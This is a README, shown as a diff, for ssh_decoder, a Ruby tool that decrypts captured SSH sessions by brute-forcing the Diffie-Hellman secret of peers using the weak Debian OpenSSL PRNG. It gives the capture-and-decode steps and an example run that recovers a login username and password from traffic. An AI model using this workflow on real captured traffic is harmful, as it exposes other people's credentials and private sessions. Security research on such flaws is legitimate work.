@@ -1,0 +1,45 @@
+ssh_decoder v1.0
+
+This tool can decipher captured SSH sessions where one of the two ends uses a vulnerable OpenSSL (debian OpenSSL PRNG vuln).
+
+You will need ssh_kex_keygen (>= 1.1) to recover the DH shared secret.
+
+How to use :
+	- get a capture (PCAP)
+	- use tcpick -wRC -wRS session.pcap 
+	- ruby ssh_decoder.rb *.dat
+	- ???
+	- profit.
+
+Common options (in fact ssh_kex_keygen options, see its README) :
+	-v : verbose (dump all ssh packets)
+	-s : consider the server as vulnerable (default)
+	-c : consider the client as vulnerable
+	-n : number of processes to bruteforce with (number of CPUs of your machine)
+
+Example session :
+$ ruby ssh_decoder.rb data/full_openssh*.dat -n 4
+ * read handshake
+cipher: aes128-cbc, mac: hmac-md5, kex_hash: sha1, compr: none
+ * bruteforce DH
+DH shared secret : 00c1eb39032ffcbfded4fd74b6884027419944dd72f5f2ca7acaec6ac7f4b46bb66765fd0ca073c1ccb6e7ec9cd8be91560f907818097c240e44b26025cdfd307298db51420da8793750da008233b92ac68e32d619cf739b1a8d31add5a787217741b7e6436eaf0fb4a33054f30f0d07cf571c24d583a6ed53fafe849203d82bd1
+ * derive keys
+ * decipher streams
+ * successful authentication packet
+{:change=>0,
+ :password=>"toto",
+ :username=>"toto",
+ :nextservice=>"ssh-connection",
+ :auth_method=>"password"}
+ * deciphered streams saved to "sshdecrypt.0.client.dat" & "sshdecrypt.0.server.dat"
+
+
+Known limitations :
+	- A few exotic ciphers are not implemented (quite unlikely to be used)
+	- Communications without group exchange (eg dropbear server) are not supported, but
+	  shouldn't be hard to add (opensource at its best)
+	- Compression support is not tested, but should work
+	- `first_kex_follows' field ignored
+
+Contact : 
+Raphaël Rigo : devel-ssh _!at!_ syscall.eu
